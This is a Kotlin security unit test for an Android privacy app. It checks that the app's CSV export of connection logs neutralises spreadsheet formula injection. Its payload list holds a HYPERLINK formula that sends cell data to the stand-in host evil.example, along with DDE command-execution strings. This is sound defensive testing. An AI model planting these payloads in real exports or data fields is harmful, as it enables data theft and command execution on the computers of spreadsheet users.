package com.privacyguard.sectest

import com.privacyguard.app.data.db.ConnectionEntity
import com.privacyguard.app.ui.statistics.ConnectionsCsv
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Test

/**
 * Security test pass (2026-10-14): app labels and SNI hosts are attacker-chosen and
 * end up in the CSV export. A field that starts with = + - @ (or tab / CR) is
 * evaluated as a formula by Excel, LibreOffice and Google Sheets even when quoted.
 *
 * Runs each payload through the real export row (ConnectionsCsv), in every
 * attacker-chosen column, and checks every resulting cell.
 */
class ExportInjectionTest {

    @Test
    fun formulaPrefixesAreNeutralised() {
        val payloads = listOf(
            "=HYPERLINK(\"https://evil.example/?d=\"&A2,\"Open report\")",
            "+cmd|' /C calc'!A0",
            "-2+3+cmd|' /C calc'!A0",
            "@SUM(1+1)*cmd|' /C calc'!A0",
            "\t=1+1",
        )
        val columns = ConnectionsCsv.HEADER.trimEnd('\n').split(',')
        val unsafeCells = payloads.flatMap { p ->
            val row = ConnectionsCsv.row(ConnectionEntity(
                appUid = 10123, appName = p, packageName = p, sniHostname = p,
                destinationIp = "93.184.216.34", protocol = "TCP",
            ))
            val cells = parseCsvLine(row.trimEnd('\n'))
            assertEquals("payload kept the row's shape: $p", columns.size, cells.size)
            cells.mapIndexedNotNull { i, cell ->
                (columns[i] to "$p -> $cell").takeIf { cell.firstOrNull() in setOf('=', '+', '-', '@', '\t', '\r') }
            }
        }
        unsafeCells.forEach { (column, detail) -> println("formula survives CSV export in $column: $detail") }
        assertFalse("CSV formula injection: ${unsafeCells.size} cells exported as formulas", unsafeCells.isNotEmpty())
    }

    /** RFC 4180 fields of one line, quotes removed, as a spreadsheet reads them. */
    private fun parseCsvLine(line: String): List<String> {
        val cells = mutableListOf<String>()
        val cell = StringBuilder()
        var quoted = false
        var i = 0
        while (i < line.length) {
            val ch = line[i]
            when {
                quoted && ch == '"' && i + 1 < line.length && line[i + 1] == '"' -> { cell.append('"'); i++ }
                ch == '"' -> quoted = !quoted
                ch == ',' && !quoted -> { cells += cell.toString(); cell.clear() }
                else -> cell.append(ch)
            }
            i++
        }
        cells += cell.toString()
        return cells
    }
}
